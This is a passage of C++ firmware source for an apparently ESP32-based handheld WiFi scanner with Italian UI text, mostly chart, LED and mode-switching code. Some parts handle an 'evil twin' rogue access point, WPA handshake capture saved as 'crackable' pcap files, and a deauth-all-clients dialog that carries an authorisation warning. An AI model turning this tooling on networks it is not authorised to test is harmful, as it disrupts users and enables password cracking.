    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    LOG_I(TAG, "Evil Twin Rogue AP started: SSID='%s' on ch%d", ssid, channel);
}

void stopEvilTwinAp() {
    stopEvilTwinLogging();
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_APSTA) {
        esp_wifi_set_mode(WIFI_MODE_STA);
    } else if (mode == WIFI_MODE_AP) {
        esp_wifi_stop();
    }
    LOG_I(TAG, "Evil Twin Rogue AP stopped");
}

constexpr auto* EAPOL_BEEP_PATH = "/data/wifiscanner/eapol_beep.mp3";
constexpr int EAPOL_BEEP_MAX_WAIT_MS = 1200;
constexpr int FADE_STEP_MS = 25;
constexpr int FADE_STEP_DB = 4;
constexpr int DUCK_FLOOR_DB = -20;

static std::atomic<bool> g_soundTaskRunning{false};

void eapolSoundTask(void* /*arg*/) {
    using namespace tt::service::music;
    if (isAvailable()) {
        Telemetry telemetry = getTelemetry();
        int trackIndex = getTrackIndex();
        bool wasPlaying = telemetry.state == State::Playing && trackIndex >= 0;
        uint32_t savedPosition = telemetry.positionSeconds;
        int originalGain = getGainDb();

        if (wasPlaying) {
            for (int g = originalGain; g > DUCK_FLOOR_DB; g -= FADE_STEP_DB) {
                setGainDb(g);
                vTaskDelay(pdMS_TO_TICKS(FADE_STEP_MS));
            }
            setGainDb(DUCK_FLOOR_DB);
            playPause();
            setGainDb(originalGain);
        }

        enqueueAndPlay(EAPOL_BEEP_PATH);
        // Wait for player to transition from Stopped/Idle to Playing (up to 250ms)
        for (int w = 0; w < 10; w++) {
            vTaskDelay(pdMS_TO_TICKS(25));
            if (getTelemetry().state == State::Playing) break;
        }
        // Wait for playback to complete (up to 1200ms)
        for (int waited = 0; waited < EAPOL_BEEP_MAX_WAIT_MS; waited += 40) {
            vTaskDelay(pdMS_TO_TICKS(40));
            auto tel = getTelemetry();
            if (tel.state == State::Stopped || tel.finished) break;
        }
        vTaskDelay(pdMS_TO_TICKS(60));
        removeFromQueueByPath(EAPOL_BEEP_PATH);

        if (wasPlaying) {
            setGainDb(DUCK_FLOOR_DB);
            playQueueIndex(trackIndex);
            seek(savedPosition);
            for (int g = DUCK_FLOOR_DB; g < originalGain; g += FADE_STEP_DB) {
                setGainDb(g);
                vTaskDelay(pdMS_TO_TICKS(FADE_STEP_MS));
            }
            setGainDb(originalGain);
        }
    }
    g_soundTaskRunning.store(false);
    vTaskDelete(nullptr);
}

void triggerEapolSound() {
    bool expected = false;
    if (!g_soundTaskRunning.compare_exchange_strong(expected, true)) {
        return; // An eapol sound is already playing
    }
    xTaskCreate([](void* arg) { eapolSoundTask(arg); }, "wifiscanner_beep", 4096, nullptr,
        tskIDLE_PRIORITY + 1, nullptr);
}

bool savePcap(const HandshakeCapture& hc, uint64_t bssidKeyVal) {
    mkdir("/sdcard/wifi-scanner", 0777);
    mkdir("/sdcard/wifi-scanner/handshakes", 0777);
    char safe[33];
    int j = 0;
    for (int i = 0; hc.ssid[i] != '\0' && j < 32; i++) {
        char c = hc.ssid[i];
        safe[j++] = (c > 32 && c < 127 && c != '/' && c != '\\') ? c : '_';
    }
    safe[j] = '\0';
    char path[128];
    struct timeval tv;
    gettimeofday(&tv, nullptr);
    if (tv.tv_sec > 1700000000) {
        struct tm tm_info;
        localtime_r(&tv.tv_sec, &tm_info);
        char timeStr[20];
        strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", &tm_info);
        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/handshakes/%s_%012llX_%s.pcap",
            safe[0] != '\0' ? safe : "hidden", (unsigned long long)bssidKeyVal, timeStr);
    } else {
        snprintf(path, sizeof(path), "/sdcard/wifi-scanner/handshakes/%s_%012llX.pcap",
            safe[0] != '\0' ? safe : "hidden", (unsigned long long)bssidKeyVal);
    }

    FILE* f = fopen(path, "wb");
    if (f == nullptr) return false;
    pcapU32(f, 0xA1B2C3D4);
    pcapU16(f, 2); pcapU16(f, 4);
    pcapU32(f, 0); pcapU32(f, 0);
    pcapU32(f, 65535);
    pcapU32(f, 105);
    if (hc.beaconLen > 0) pcapRecord(f, hc.beacon, hc.beaconLen);
    for (int s = 0; s < 4; s++) {
        if (hc.eapolLen[s] > 0) pcapRecord(f, hc.eapol[s], hc.eapolLen[s]);
    }
    fclose(f);
    return true;
}

#else

void startCapture(Context*) {}
void stopCapture(Context*) {}
bool isCaptureSupported() { return false; }
void setCaptureLockChannel(int) {}
int getCaptureLockChannel() { return 0; }
int getCurrentRadioChannel() { return 0; }
void sendDeauthBurst(const uint8_t*, const uint8_t*) {}
void sendDeauthBurstOnChannel(const uint8_t*, int, const uint8_t* = nullptr) {}
void sendAssociationRequestBurst(const uint8_t*, const char*, int) {}
void startEvilTwinAp(const char*, int) {}
void stopEvilTwinAp() {}
bool startEvilTwinLogging(const char*) { return false; }
void stopEvilTwinLogging() {}
void logEvilTwinPacket(const uint8_t*, int) {}

#endif

void flushHandshakes(Context* ctx) {
#ifdef ESP_PLATFORM
    auto ready = std::make_unique<HandshakeCapture>();
    uint64_t key = 0;
    bool have = false;
    if (ctx->mutex.lock(50 / portTICK_PERIOD_MS)) {
        for (auto& [k, hc] : ctx->handshakes) {
            bool crackable = ((hc.msgMask & 0x03) == 0x03) || hc.hasPmkid;
            if (crackable && !hc.saved) {
                *ready = hc;
                key = k;
                hc.saved = true;
                have = true;
                break;
            }
        }
        ctx->mutex.unlock();
    }
    if (have) {
        triggerEapolSound();
        if (savePcap(*ready, key)) {
            if (ctx->mutex.lock(50 / portTICK_PERIOD_MS)) {
                ctx->handshakesSaved++;
                ctx->mutex.unlock();
            }
        }
    }
#else
    (void)ctx;
#endif
}

const char* authToString(WifiAuthenticationType type) {
    switch (type) {
        case WIFI_AUTHENTICATION_TYPE_OPEN: return "OPEN";
        case WIFI_AUTHENTICATION_TYPE_WEP: return "WEP";
        case WIFI_AUTHENTICATION_TYPE_WPA_PSK: return "WPA";
        case WIFI_AUTHENTICATION_TYPE_WPA2_PSK: return "WPA2";
        case WIFI_AUTHENTICATION_TYPE_WPA_WPA2_PSK: return "WPA/2";
        case WIFI_AUTHENTICATION_TYPE_WPA2_ENTERPRISE: return "WPA2-E";
        case WIFI_AUTHENTICATION_TYPE_WPA3_PSK: return "WPA3";
        case WIFI_AUTHENTICATION_TYPE_WPA2_WPA3_PSK: return "WPA2/3";
        default: return "?";
    }
}

const char* cipherToString(WifiCipherType cipher) {
    switch (cipher) {
        case WIFI_AP_CIPHER_NONE: return "nessuna";
        case WIFI_AP_CIPHER_WEP: return "WEP";
        case WIFI_AP_CIPHER_TKIP: return "TKIP";
        case WIFI_AP_CIPHER_CCMP: return "CCMP (AES)";
        case WIFI_AP_CIPHER_TKIP_CCMP: return "TKIP+CCMP";
        case WIFI_AP_CIPHER_GCMP: return "GCMP";
        default: return "sconosciuta (solo cattura)";
    }
}

std::string phyToString(uint8_t flags) {
    std::string result;
    if (flags & WIFI_AP_PHY_11B) result += "b";
    if (flags & WIFI_AP_PHY_11G) result += "g";
    if (flags & WIFI_AP_PHY_11N) result += "n";
    if (flags & WIFI_AP_PHY_11AX) result += "ax";
    if (flags & WIFI_AP_PHY_WPS) result += " WPS";
    return result.empty() ? "?" : ("802.11" + result);
}

const char* displaySsid(const WifiApRecord& record) {
    return record.ssid[0] != '\0' ? record.ssid : "(nascosta)";
}

int frequencyMhz(int channel) { return 2407 + 5 * channel; }

float estimateDistanceMeters(int8_t rssi) {
    constexpr float txPowerAt1m = -40.0f;
    constexpr float pathLossExponent = 2.5f;
    return std::pow(10.0f, (txPowerAt1m - (float)rssi) / (10.0f * pathLossExponent));
}

bool isRadioUsable() {
    using enum service::wifi::RadioState;
    auto state = service::wifi::getRadioState();
    return state == On || state == ConnectionPending || state == ConnectionActive;
}

void connectTo(Context* ctx, const std::string& ssid) {
    service::wifi::settings::WifiApSettings settings;
    if (service::wifi::settings::load(ssid, settings)) {
        service::wifi::connect(settings, false);
    } else {
        wificonnect::start(ssid);
    }
    (void)ctx;
}

void fillBell(lv_obj_t* chart, lv_chart_series_t* series, int channel, int8_t rssi) {
    int32_t values[CHART_POINTS];
    int32_t height = std::clamp<int32_t>(rssi - SIGNAL_FLOOR_DBM, 1, SIGNAL_RANGE_DB);
    float step = (CH_AXIS_MAX - CH_AXIS_MIN) / (CHART_POINTS - 1);
    for (int i = 0; i < CHART_POINTS; i++) {
        float x = CH_AXIS_MIN + step * i;
        float distance = std::fabs(x - (float)channel) / BELL_HALF_WIDTH;
        values[i] = distance < 1.0f ? (int32_t)(height * (1.0f - distance * distance)) : 0;
    }
    lv_chart_set_series_values(chart, series, values, CHART_POINTS);
}

std::vector<SeenAp> sortedByRssi(Context* ctx) {
    std::vector<SeenAp> result;
    uint64_t now = nowMs();
    for (auto it = ctx->seen.begin(); it != ctx->seen.end();) {
        if (now - it->second.lastSeenMs > ROW_EXPIRY_MS) {
            it = ctx->seen.erase(it);
        } else {
            result.push_back(it->second);
            ++it;
        }
    }
    std::sort(result.begin(), result.end(), [](const SeenAp& a, const SeenAp& b) {
        return a.record.rssi > b.record.rssi;
    });
    return result;
}

void mergeActiveScan(Context* ctx, const std::vector<WifiApRecord>& records) {
    uint64_t now = nowMs();
    for (const auto& record : records) {
        uint64_t key = bssidKey(record.bssid);
        auto it = ctx->seen.find(key);
        if (it == ctx->seen.end()) {
            SeenAp ap{};
            ap.record = record;
            sanitizeAscii(ap.record.ssid);
            ap.firstSeenMs = now;
            ap.lastSeenMs = now;
            ap.rssiMin = ap.rssiMax = record.rssi;
            ap.colorIndex = ctx->nextColor++ % MAX_SERIES;
            ctx->seen.emplace(key, ap);
        } else {
            SeenAp& ap = it->second;
            ap.record = record;
            sanitizeAscii(ap.record.ssid);
            ap.fromCapture = false;
            ap.lastSeenMs = now;
            ap.rssiMin = std::min(ap.rssiMin, record.rssi);
            ap.rssiMax = std::max(ap.rssiMax, record.rssi);
        }
    }
}

void saveLedConfig(Context* ctx) {
    namespace np = service::neopixel;
    ctx->savedAnim = np::getActiveAnimation();
    ctx->savedColorMode = np::getActiveColorMode();
    np::getActiveColor(&ctx->savedR, &ctx->savedG, &ctx->savedB);
    ctx->savedBrightness = np::getActiveBrightness();
    ctx->savedSpeed = np::getActiveSpeed();
    ctx->savedVuActive = np::isVuActive();
    ctx->savedVuDecay = np::isVuDecayEnabled();
    ctx->savedVuAutoGain = np::isVuAutoGainEnabled();
    ctx->savedVuBeatFlash = np::isVuBeatFlashEnabled();
    ctx->savedVuPeakHold = np::isVuPeakHoldEnabled();
    ctx->savedVuPalette = np::getVuPalette();
    ctx->savedVuOrigin = np::getVuOrigin();
    np::getVuColor(&ctx->savedVuR, &ctx->savedVuG, &ctx->savedVuB);
    ctx->savedVuBrightness = np::getVuBrightness();
    ctx->savedVuSensitivity = np::getVuSensitivity();
    ctx->ledSaved = true;
}

void restoreLedConfig(Context* ctx) {
    namespace np = service::neopixel;
    if (!ctx->ledSaved) return;
    np::setVuPalette(ctx->savedVuPalette);
    np::setVuOrigin(ctx->savedVuOrigin);
    np::setVuColor(ctx->savedVuR, ctx->savedVuG, ctx->savedVuB);
    np::setVuBrightness(ctx->savedVuBrightness);
    np::setVuSensitivity(ctx->savedVuSensitivity);
    np::setVuDecayEnabled(ctx->savedVuDecay);
    np::setVuAutoGainEnabled(ctx->savedVuAutoGain);
    np::setVuBeatFlashEnabled(ctx->savedVuBeatFlash);
    np::setVuPeakHoldEnabled(ctx->savedVuPeakHold);
    np::setVuActive(ctx->savedVuActive);
    np::setActiveColorMode(ctx->savedColorMode);
    np::setActiveColor(ctx->savedR, ctx->savedG, ctx->savedB);
    np::setActiveSpeed(ctx->savedSpeed);
    np::setActiveBrightness(ctx->savedBrightness);
    np::setActiveAnimation(ctx->savedAnim);
}

static bool g_tactical_mode = false;
static uint8_t g_saved_backlight_duty = 200;
static Context* g_active_scanner_ctx = nullptr;

static Device* getDisplayBacklight() {
    Device* display = nullptr;
    if (device_get_first_by_type(&DISPLAY_TYPE, &display) != ERROR_NONE || display == nullptr) {
        return nullptr;
    }
    if (device_get_driver(display)->api == nullptr) {
        device_put(display);
        return nullptr;
    }
    Device* backlight = nullptr;
    display_get_backlight(display, &backlight);
    device_put(display);
    return backlight;
}

void updateLeds(Context* ctx);

void setTacticalMode(Context* ctx, bool enabled) {
    g_tactical_mode = enabled;
    auto* bl = getDisplayBacklight();
    if (bl != nullptr) {
        if (g_tactical_mode) {
            uint8_t current = 200;
            if (backlight_get_brightness(bl, &current) == ERROR_NONE && current > 15) {
                g_saved_backlight_duty = current;
            }
            backlight_set_brightness(bl, 15);
        } else {
            backlight_set_brightness(bl, g_saved_backlight_duty);
        }
    }

    namespace np = service::neopixel;
    if (g_tactical_mode) {
        ctx->vuFeeding.store(false);
        np::setVuActive(false);
        np::setActiveAnimation(np::Animation::Off);
        ctx->ledViewApplied = -1;
    } else {
        ctx->ledViewApplied = -1;
        updateLeds(ctx);
    }

    lvgl_lock();
    if (ctx->statusLabel != nullptr) {
        if (g_tactical_mode) {
            lv_label_set_text(ctx->statusLabel, "TACTICAL MODE (LEDs OFF / Dim)");
        } else {
            lv_label_set_text(ctx->statusLabel, "Tactical Mode OFF");
        }
    }
    lvgl_unlock();
}

void updateLeds(Context* ctx) {
    if (g_tactical_mode) {
        namespace np = service::neopixel;
        ctx->vuFeeding.store(false);
        np::setVuActive(false);
        np::setActiveAnimation(np::Animation::Off);
        return;
    }
    namespace np = service::neopixel;
    Page page;
    RadioMode mode;
    uint64_t selectedKey;
    if (ctx->mutex.lock(0)) {
        page = ctx->page;
        mode = ctx->mode;
        selectedKey = ctx->selectedKey;
        ctx->mutex.unlock();
    } else {
        return;
    }

    if (page == Page::Detail || page == Page::Clients || page == Page::EvilTwinDetail) {
        int colorIdx = 0;
        int8_t rssi = SIGNAL_FLOOR_DBM;
        bool found = false;
        if (ctx->mutex.lock(0)) {
            auto it = ctx->seen.find(selectedKey);
            if (it != ctx->seen.end()) {
                colorIdx = it->second.colorIndex % MAX_SERIES;
                rssi = it->second.record.rssi;
                found = true;
            }
            ctx->mutex.unlock();
        }
        if (!found) return;

        if (ctx->ledViewApplied != 3) {
            np::setVuPalette(np::VuPalette::Solid);
            np::setVuOrigin(np::VuOrigin::BothLeft);
            np::setVuDecayEnabled(true);
            np::setVuAutoGainEnabled(false);
            np::setVuBeatFlashEnabled(false);
            np::setVuPeakHoldEnabled(true);
            np::setVuPeakBrightness(90);
            np::setVuSensitivity(100);
            np::setVuBrightness(ctx->savedBrightness != 0 ? ctx->savedBrightness : 70);
            np::setVuActive(true);
            ctx->vuFeeding.store(true);
            ctx->ledViewApplied = 3;
            ctx->ledColorApplied = -1;
        }
        if (ctx->ledColorApplied != colorIdx) {
            uint32_t color = SERIES_COLORS[colorIdx];
            np::setVuColor((color >> 16) & 0xFF, (color >> 8) & 0xFF, color & 0xFF);
            ctx->ledColorApplied = colorIdx;
        }
        int32_t peak = std::clamp<int32_t>(rssi - SIGNAL_FLOOR_DBM, 0, SIGNAL_RANGE_DB);
        ctx->vuLevel.store((int)(peak * 255 / SIGNAL_RANGE_DB));
        ctx->vuRefreshTick.store((uint32_t)lv_tick_get());
        return;
    }

    if (ctx->ledViewApplied == 3) {
        ctx->vuFeeding.store(false);
        np::setVuActive(false);
    }

    int view = mode == RadioMode::Capture ? 1 : (mode == RadioMode::ActiveScan ? 0 : 2);
    if (ctx->ledViewApplied == view) return;
    ctx->ledViewApplied = view;
    ctx->ledColorApplied = -1;

    if (view == 2) {
        restoreLedConfig(ctx);
        return;
    }

    np::setActiveColorMode(np::ColorMode::Static);
    if (view == 0) np::setActiveColor(0, 255, 0);
    else np::setActiveColor(255, 0, 0);
    np::setActiveSpeed(2);
    np::setActiveAnimation(np::Animation::Scanner);
}

void showPage(Context* ctx, Page page);
void updateViews(Context* ctx);
void updateEvilTwinDetailPage(Context* ctx);

void updateGraph(Context* ctx, const std::vector<SeenAp>& aps) {
    if (ctx->chart == nullptr) return;

    lv_obj_clean(ctx->labelLayer);
    int chartWidth = lv_obj_get_width(ctx->chart);
    int chartHeight = lv_obj_get_height(ctx->chart);

    int drawn = 0;
    for (const auto& ap : aps) {
        if (drawn >= MAX_SERIES) break;
        if (ap.record.channel < 1 || ap.record.channel > 13) continue;

        uint32_t color = SERIES_COLORS[ap.colorIndex % MAX_SERIES];
        lv_chart_set_series_color(ctx->chart, ctx->series[drawn], lv_color_hex(color));
        fillBell(ctx->chart, ctx->series[drawn], ap.record.channel, ap.record.rssi);
        lv_chart_hide_series(ctx->chart, ctx->series[drawn], false);

        auto* label = lv_label_create(ctx->labelLayer);
        lv_label_set_text(label, displaySsid(ap.record));
        lv_obj_set_style_text_color(label, lv_color_hex(color), 0);
        lv_obj_update_layout(label);
        int width = lv_obj_get_width(label);
        int height = lv_obj_get_height(label);

        int xPx = (int)(chartWidth * channelFraction(ap.record.channel)) - width / 2;
        if (xPx < 0) xPx = 0;
        if (xPx + width > chartWidth) xPx = chartWidth - width;

        int32_t peak = std::clamp<int32_t>(ap.record.rssi - SIGNAL_FLOOR_DBM, 1, SIGNAL_RANGE_DB);
        int yPx = chartHeight - (chartHeight * peak / SIGNAL_RANGE_DB);
        yPx -= height;
        if (yPx < 0) yPx = 0;
        if (yPx + height > chartHeight) yPx = chartHeight - height;

        lv_obj_set_pos(label, xPx, yPx);
        drawn++;
    }
    for (int i = drawn; i < MAX_SERIES; i++) {
        lv_chart_hide_series(ctx->chart, ctx->series[i], true);
    }

    if (ctx->activeChannelIndicator != nullptr) {
        RadioMode mode = RadioMode::Stopped;
        if (ctx->mutex.lock(0)) {
            mode = ctx->mode;
            ctx->mutex.unlock();
        }
        if (mode == RadioMode::Capture) {
            int lock = getCaptureLockChannel();
            int ch = (lock >= 1 && lock <= 13) ? lock : getCurrentRadioChannel();
            if (ch >= 1 && ch <= 13 && chartWidth > 0) {
                lv_obj_remove_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_HIDDEN);
                int xPx = (int)(chartWidth * channelFraction(ch)) - 7;
                if (xPx < 0) xPx = 0;
                if (xPx + 14 > chartWidth) xPx = chartWidth - 14;
                lv_obj_set_pos(ctx->activeChannelIndicator, xPx, 0);
                bool isLocked = (lock >= 1 && lock <= 13);
                uint32_t col = isLocked ? 0xF59E0B : 0x06B6D4;
                lv_obj_set_style_bg_color(ctx->activeChannelIndicator, lv_color_hex(col), 0);
                lv_obj_set_style_border_color(ctx->activeChannelIndicator, lv_color_hex(col), 0);
            } else {
                lv_obj_add_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_HIDDEN);
            }
        } else {
            lv_obj_add_flag(ctx->activeChannelIndicator, LV_OBJ_FLAG_HIDDEN);
        }
    }
}

void onSelectFromList(lv_event_t* event);

void onShowList(lv_event_t* event) {
    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::List);
}

void refreshModeButtons(Context* ctx) {
    RadioMode mode;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        mode = ctx->mode;
        ctx->mutex.unlock();
    } else {
        return;
    }
    if (ctx->scanButton != nullptr) {
        if (mode == RadioMode::ActiveScan) {
            lv_obj_add_state(ctx->scanButton, LV_STATE_DISABLED);
            lv_obj_set_style_bg_color(ctx->scanButton, lv_color_hex(0x16A34A), LV_STATE_DEFAULT);
            lv_obj_set_style_bg_color(ctx->scanButton, lv_color_hex(0x16A34A), LV_STATE_DISABLED);
        } else {
            lv_obj_remove_state(ctx->scanButton, LV_STATE_DISABLED);
            lv_obj_remove_local_style_prop(ctx->scanButton, LV_STYLE_BG_COLOR, LV_STATE_DEFAULT);
            lv_obj_remove_local_style_prop(ctx->scanButton, LV_STYLE_BG_COLOR, LV_STATE_DISABLED);
        }
    }
    if (ctx->captureButton != nullptr) {
        if (mode == RadioMode::Capture || !isCaptureSupported()) {
            lv_obj_add_state(ctx->captureButton, LV_STATE_DISABLED);
            int lock = getCaptureLockChannel();
            bool isLocked = (lock >= 1 && lock <= 13);
            lv_obj_set_style_bg_color(ctx->captureButton, lv_color_hex(0xDC2626), LV_STATE_DEFAULT);
            lv_obj_set_style_bg_color(ctx->captureButton, lv_color_hex(0xDC2626), LV_STATE_DISABLED);
            lv_obj_t* lbl = lv_obj_get_child(ctx->captureButton, 0);
            if (lbl != nullptr) {
                lv_label_set_text(lbl, isLocked ? LV_SYMBOL_SETTINGS : LV_SYMBOL_EYE_OPEN);
            }
        } else {
            lv_obj_remove_state(ctx->captureButton, LV_STATE_DISABLED);
            lv_obj_remove_local_style_prop(ctx->captureButton, LV_STYLE_BG_COLOR, LV_STATE_DEFAULT);
            lv_obj_remove_local_style_prop(ctx->captureButton, LV_STYLE_BG_COLOR, LV_STATE_DISABLED);
            lv_obj_t* lbl = lv_obj_get_child(ctx->captureButton, 0);
            if (lbl != nullptr) {
                lv_label_set_text(lbl, LV_SYMBOL_EYE_OPEN);
            }
        }
    }
    if (ctx->stopButton != nullptr) {
        if (mode == RadioMode::Stopped) {
            lv_obj_add_state(ctx->stopButton, LV_STATE_DISABLED);
        } else {
            lv_obj_remove_state(ctx->stopButton, LV_STATE_DISABLED);
        }
        lv_obj_remove_local_style_prop(ctx->stopButton, LV_STYLE_BG_COLOR, LV_STATE_DEFAULT);
        lv_obj_remove_local_style_prop(ctx->stopButton, LV_STYLE_BG_COLOR, LV_STATE_DISABLED);
    }
}

void setMode(Context* ctx, RadioMode mode) {
    RadioMode previous;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        previous = ctx->mode;
        ctx->mode = mode;
        ctx->mutex.unlock();
    } else {
        return;
    }
    if (previous == RadioMode::Capture && mode != RadioMode::Capture) stopCapture(ctx);
    if (mode == RadioMode::Capture) startCapture(ctx);
    refreshModeButtons(ctx);

    if (mode == RadioMode::Stopped) {
        lvgl_lock();
        if (ctx->modeBadgeLabel != nullptr) {
            lv_label_set_text(ctx->modeBadgeLabel, "STOP");
            lv_obj_set_style_bg_color(ctx->modeBadge, lv_color_hex(0x282828), 0);
            lv_obj_set_style_text_color(ctx->modeBadgeLabel, lv_color_hex(0x888888), 0);
        }
        if (ctx->statusLabel != nullptr) lv_label_set_text(ctx->statusLabel, "Capture stopped");
        lvgl_unlock();
    } else if (mode == RadioMode::ActiveScan) {
        lvgl_lock();
        if (ctx->modeBadgeLabel != nullptr) {
            lv_label_set_text(ctx->modeBadgeLabel, "SCAN");
            lv_obj_set_style_bg_color(ctx->modeBadge, lv_color_hex(0x16A34A), 0);
            lv_obj_set_style_text_color(ctx->modeBadgeLabel, lv_color_white(), 0);
        }
        if (ctx->statusLabel != nullptr) lv_label_set_text(ctx->statusLabel, "Active scan running");
        lvgl_unlock();
    } else if (mode == RadioMode::Capture) {
        lvgl_lock();
        if (ctx->modeBadgeLabel != nullptr) {
            lv_label_set_text(ctx->modeBadgeLabel, "HOP");
            lv_obj_set_style_bg_color(ctx->modeBadge, lv_color_hex(0xDC2626), 0);
            lv_obj_set_style_text_color(ctx->modeBadgeLabel, lv_color_white(), 0);
        }
        if (ctx->statusLabel != nullptr) lv_label_set_text(ctx->statusLabel, "Capture / Sniff running");
        lvgl_unlock();
    }

    updateLeds(ctx);
}

void onStartScan(lv_event_t* event) {
    setMode(static_cast<Context*>(lv_event_get_user_data(event)), RadioMode::ActiveScan);
}

void onStartCapture(lv_event_t* event) {
    setMode(static_cast<Context*>(lv_event_get_user_data(event)), RadioMode::Capture);
}

void onStop(lv_event_t* event) {
    setMode(static_cast<Context*>(lv_event_get_user_data(event)), RadioMode::Stopped);
}

void updateDetail(Context* ctx);

static void onMediaKey(uint32_t key, bool is_long_press) {
    if (g_active_scanner_ctx == nullptr) return;
    auto* ctx = g_active_scanner_ctx;

    if (key == 0x20003 || is_long_press) {
        // Toggle Tactical Mode
        setTacticalMode(ctx, !g_tactical_mode);
        return;
    }

    if (key == 0x20000) {
        // Short-press Play: cycle ActiveScan -> Capture -> Stopped -> ActiveScan
        RadioMode cur = RadioMode::Stopped;
        if (ctx->mutex.lock(100 / portTICK_PERIOD_MS)) {
            cur = ctx->mode;
            ctx->mutex.unlock();
        }
        RadioMode next;
        if (cur == RadioMode::ActiveScan) next = RadioMode::Capture;
        else if (cur == RadioMode::Capture) next = RadioMode::Stopped;
        else next = RadioMode::ActiveScan;
        setMode(ctx, next);
        return;
    }

    if (key == 0x20001) {
        // Prev (<<): step lock channel --
        int ch = getCaptureLockChannel();
        if (ch <= 0) {
            ch = 13;
        } else {
            ch--;
            if (ch < 1) ch = 13;
        }
        if (ctx->mode != RadioMode::Capture) setMode(ctx, RadioMode::Capture);
        setCaptureLockChannel(ch);
        updateLeds(ctx);
        if (ctx->page == Page::Detail) updateDetail(ctx);
        lvgl_lock();
        if (ctx->statusLabel != nullptr) {
            char buf[32];
            snprintf(buf, sizeof(buf), "Channel Lock: CH %d", ch);
            lv_label_set_text(ctx->statusLabel, buf);
        }
        lvgl_unlock();
        return;
    }

    if (key == 0x20002) {
        // Next (>>): step lock channel ++
        int ch = getCaptureLockChannel();
        if (ch <= 0) {
            ch = 1;
        } else {
            ch++;
            if (ch > 13) ch = 1;
        }
        if (ctx->mode != RadioMode::Capture) setMode(ctx, RadioMode::Capture);
        setCaptureLockChannel(ch);
        updateLeds(ctx);
        if (ctx->page == Page::Detail) updateDetail(ctx);
        lvgl_lock();
        if (ctx->statusLabel != nullptr) {
            char buf[32];
            snprintf(buf, sizeof(buf), "Channel Lock: CH %d", ch);
            lv_label_set_text(ctx->statusLabel, buf);
        }
        lvgl_unlock();
        return;
    }
}

void onToggleLock(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    int channel = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        channel = ctx->detailChannel;
        ctx->mutex.unlock();
    }
    if (channel < 1 || channel > 13) return;

    bool nowLocked = getCaptureLockChannel() != channel;
    if (nowLocked) {
        if (ctx->mode != RadioMode::Capture) setMode(ctx, RadioMode::Capture);
        setCaptureLockChannel(channel);
    } else {
        setCaptureLockChannel(0);
    }
    updateDetail(ctx);
    updateLeds(ctx);
}

void onDeauthPressed(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    char ssid[33] = {};
    bool found = false;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        auto it = ctx->seen.find(ctx->selectedKey);
        if (it != ctx->seen.end()) {
            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
            found = true;
        }
        ctx->mutex.unlock();
    }
    if (!found) return;

    char message[160];
    snprintf(message, sizeof(message),
        "Invia deauth a TUTTI i client di \"%s\"?\nSolo su reti/dispositivi tuoi o autorizzati.",
        ssid[0] != '\0' ? ssid : "(nascosta)");
    ctx->deauthDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Deauth", message, { "Invia", "Annulla" });
}

void onShowClients(lv_event_t* event) {
    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::Clients);
}

void onShowEvilTwinDetail(lv_event_t* event) {
    showPage(static_cast<Context*>(lv_event_get_user_data(event)), Page::EvilTwinDetail);
}

void onSelectFromList(lv_event_t* event) {
    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
    lv_obj_t* row = lv_event_get_current_target_obj(event);
    uint64_t key = 0;
    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
        for (const auto& [k, w] : ctx->rows) {
            if (w == row) { key = k; break; }
        }
        ctx->selectedKey = key;
        auto it = ctx->seen.find(key);
        ctx->detailBeaconBaseline = it != ctx->seen.end() ? it->second.packetCount : 0;
        ctx->detailChannel = it != ctx->seen.end() ? (int)it->second.record.channel : 0;
        ctx->mutex.unlock();
    }
    if (key != 0) showPage(ctx, Page::Detail);
}

constexpr int LIST_ROW_HEIGHT = 30;
constexpr int COL_CH = 34;
constexpr int COL_POWER = 56;
constexpr int COL_SEC = 56;
constexpr int COL_CLI = 30;

lv_obj_t* addFieldLabel(lv_obj_t* row, int width) {
    auto* label = lv_label_create(row);
    lv_obj_set_width(label, width);
    lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_RIGHT, 0);
    lv_label_set_long_mode(label, LV_LABEL_LONG_MODE_CLIP);
    return label;
}

void addLegendLabel(lv_obj_t* header, const char* text, int width) {
    auto* label = lv_label_create(header);
    lv_obj_set_width(label, width);
    lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_RIGHT, 0);
    lv_label_set_text(label, text);
}

lv_obj_t* createListRow(Context* ctx, uint64_t key) {
    auto* row = lv_list_add_button(ctx->list, nullptr, "");
    lv_obj_clean(row);
    lv_obj_set_height(row, LIST_ROW_HEIGHT);
    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(row, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_all(row, 2, 0);
    lv_obj_set_style_pad_column(row, 4, 0);
    (void)key;
    lv_obj_add_event_cb(row, onSelectFromList, LV_EVENT_CLICKED, ctx);

    auto* chip = lv_obj_create(row);
    lv_obj_set_size(chip, 6, LV_PCT(90));
    lv_obj_set_style_radius(chip, 2, 0);
    lv_obj_set_style_border_width(chip, 0, 0);
    lv_obj_set_style_pad_all(chip, 0, 0);
    lv_obj_remove_flag(chip, LV_OBJ_FLAG_SCROLLABLE);

    auto* name = lv_label_create(row);
    lv_label_set_long_mode(name, LV_LABEL_LONG_MODE_SCROLL_CIRCULAR);
    lv_obj_set_flex_grow(name, 1);

    addFieldLabel(row, COL_CH);
    addFieldLabel(row, COL_POWER);
    addFieldLabel(row, COL_SEC);
    addFieldLabel(row, COL_CLI);
